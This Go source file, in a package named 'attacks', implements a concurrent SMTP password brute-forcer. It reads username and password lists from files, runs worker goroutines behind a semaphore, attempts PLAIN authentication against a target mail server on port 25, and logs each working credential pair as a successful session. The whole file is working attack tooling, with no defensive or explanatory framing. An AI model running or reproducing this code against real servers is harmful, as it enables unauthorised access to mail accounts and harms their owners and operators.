package attacks

import (
    "log"
    "fmt"
    "net/smtp"
)



func work_smtp(job readerChan, serverIP, serverPort string){
    fmt.Println(yellow("[attemp] ", job))
    defer wg.Done()
    
    hostname := serverIP
    auth := smtp.PlainAuth("", job.user, job.pass, hostname)

    from       := job.user
    msg        := []byte("dummy message")
    recipients := []string{job.user}

    err := smtp.SendMail(hostname+":25", auth, from, recipients, msg)
    if err != nil {
        log.Println("[!]",err, red("[-] Login failed", job.user,":", job.pass," ",job.pos))

        return
    }else{
        log.Println(green("[+][+] Session Connect at ",serverIP,":", serverPort," ", job.user,":", job.pass," ",job.pos))
    }

    

}

func Smtp_attack_start(userFile, passFile, serverIP, serverPort string, n_workers int){
    if n_workers == 0{
        n_workers = 9
    }

    log.Println ("[0] Starting jobs")
    log.Println(userFile, passFile, serverIP, serverPort, n_workers)

    rchan := make(chan readerChan, n_workers)
    go read_files(userFile, passFile, rchan)
    var sem = make(chan int, n_workers)
    for i:= 0; i< n_workers; i++{
        sem <- 1
    }
    for {
        select {
        case job,ok := <- rchan:
            if !ok {
                wg.Wait()
                fmt.Println("[info] Jobs Finished")
                return
            }
            wg.Add(1)
            <-sem
            // sem <- 1
            go func(job readerChan){
                work_smtp(job, serverIP, serverPort)
                sem <- 1
                // <-sem
            }(job)
        }
    }
    
}